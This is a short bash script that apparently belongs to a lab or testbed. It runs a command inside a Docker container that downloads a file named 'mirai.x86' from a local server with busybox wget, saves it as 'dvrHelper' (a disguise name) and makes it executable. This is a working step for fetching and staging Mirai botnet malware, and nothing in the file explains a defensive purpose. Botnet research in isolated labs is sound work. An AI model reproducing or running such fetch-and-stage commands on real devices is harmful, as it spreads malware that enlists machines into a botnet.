#!/bin/bash
docker exec -w / -it bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
